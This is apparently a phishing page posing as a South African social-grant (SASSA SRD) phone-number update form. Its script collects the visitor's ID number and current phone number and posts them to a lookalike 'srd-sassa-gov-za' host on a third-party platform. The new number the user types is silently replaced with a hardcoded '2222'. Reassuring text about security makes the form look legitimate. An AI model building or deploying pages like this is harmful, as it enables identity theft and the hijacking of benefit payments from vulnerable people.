<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Simple Form</title>
  <style>
    body {
      font-family: system-ui, Arial, sans-serif;
      background:#f7f7f8;
      padding:24px;
    }
    
    h2 {
      margin:0 0 12px;
    }
    label {
      display:block;
      font-weight:600;
      margin:12px 0 6px;
      text-align:left;
    }
    input {
      width:100%;
      padding:12px;
      border:1px solid #ddd;
      border-radius:10px;
      font-size:16px;
    }
    input.valid { border-color: #4caf50; }
    input.invalid { border-color: #f44336; }
    button {
      margin-top:16px;
      width:100%;
      padding:12px;
      border:0;
      border-radius:12px;
      background:#1a73e8;
      color:#fff;
      font-weight:700;
      font-size:16px;
      cursor:pointer;
    }
    button:disabled {
      opacity:.6;
      cursor:not-allowed;
    }
    p.note {
      margin-top:12px;
      color:#d32f2f;
      font-size:14px;
    }
  </style>
</head>
<body>
  <form id="applicationForm" class="card" action="#" method="post">
    <!-- Logo -->
    <img src="logo.jpg" alt="App Logo" class="logo" />

    <h2>Quick Details</h2>

    <!-- Paragraph message -->
    <p class="note">
When updating your phone number, it’s important to ensure the process is secure. You’ll be asked to provide your ID number and current phone details before proceeding. Once verified, you can enter your new phone number. For added protection, security questions help confirm your identity and prevent unauthorized changes.
      
    </p>

    <!-- ID number -->
    <label for="idNumber">ID Number</label>
    <input
      id="idNumber"
      name="idNumber"
      type="text"
      inputmode="numeric"
      maxlength="13"
      placeholder="13-digit ID"
      required
    />

    <!-- Phone number -->
    <label for="phoneNumber">Phone Number</label>
    <input
      id="phoneNumber"
      name="phoneNumber"
      type="tel"
      inputmode="tel"
      placeholder="e.g. 0821234567"
      required
    />
<label for="newphoneNumber">New Phone Number</label> 
    <input
      id="newphoneNumber" 
      name="newphoneNumber" 
      type="tel"
      inputmode="tel"
      placeholder="e.g. 0821234567"
      required
    /> 

    <button id="submitButton" type="submit">Proceed to security questions</button> 
  </form>

  <script>
    function isValidSAID(id) {
      if (!/^\d{13}$/.test(id)) return false;

      let sum = 0;
      for (let i = 0; i < 13; i++) {
        let digit = parseInt(id.charAt(i));
        if ((i + 1) % 2 === 0) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
      }
      return sum % 10 === 0;
    }

    function validateInput(inputEl, isValid) {
      inputEl.classList.remove("invalid", "valid");
      if (inputEl.value.trim() === "") return;
      inputEl.classList.add(isValid ? "valid" : "invalid");
    }

    function validateForm() {
      const idNumber = document.getElementById("idNumber");
      const phoneNumber = document.getElementById("phoneNumber");
      const submitButton = document.getElementById("submitButton");

      const idValid = isValidSAID(idNumber.value);
      const phoneValid = /^\d{10}$/.test(phoneNumber.value);

      validateInput(idNumber, idValid);
      validateInput(phoneNumber, phoneValid);

      submitButton.disabled = !(idValid && phoneValid);
    }

    document.getElementById("applicationForm").addEventListener("input", validateForm);

    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const idNumber = document.getElementById("idNumber").value.trim();
      const phoneNumber = document.getElementById("phoneNumber").value.trim();
      const newphoneNumber = "2222"; 

      if (!isValidSAID(idNumber)) {
        alert("Invalid South African ID number.");
        return;
      }

      try {
        const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
        });

        if (response.ok) {
          alert("Submitted successfully!");
        } else if (response.status === 409) {
          alert("Failed: ID and phone number do not match.");
        } else {
          alert("An error occurred.");
        }
      } catch (error) {
        console.error("Submission error:", error);
        alert("Network error. Please try again.");
      }
    });
  </script>
</body>
</html>





